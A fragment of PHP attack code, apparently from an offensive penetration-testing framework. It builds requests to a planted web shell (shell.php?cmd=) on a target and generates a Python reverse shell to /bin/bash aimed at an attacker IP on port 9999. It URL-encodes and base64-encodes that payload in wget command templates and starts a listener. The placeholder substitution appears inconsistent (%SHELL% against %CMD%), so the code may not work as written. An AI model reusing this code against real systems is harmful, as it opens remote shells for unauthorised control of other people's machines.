        $flag_poc = FALSE;
        $flag_poc = TRUE;
        
        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
        $test->poc($flag_poc);
        $url_id = "http://$test->ip:80/shell.php?cmd=%ID%";
        $url_cmd = "http://$test->ip:80/shell.php?cmd=%CMD%";
        $attacker_ip = $this->ip4addr4target($test->ip);
        $attacker_port = rand(1024,65535);
        $attacker_port = 9999;
        $shell = "/bin/bash";
        $cmd_nc = $this->rev8python($attacker_ip, $attacker_port, $shell);
        $cmd_nc_encode = $test->url2encode($cmd_nc);
        $template_id = "wget --user-agent=\"$test->user2agent\" --tries=2 --no-check-certificate \"$url_id\" -qO-  ";
        $template_shell = "wget --user-agent=\"$test->user2agent\" --tries=2 --no-check-certificate \"$url_cmd\" -qO-  ";
        $template_cmd = str_replace("%SHELL%",$cmd_nc_encode,$template_shell);
        $templateB64_cmd = base64_encode($template_cmd);
        $templateB64_shell = base64_encode($template_shell);
        $test->service4lan($template_cmd,$templateB64_shell,$attacker_port,"T");
        
    }
    
    
    
    
    
    
}
?>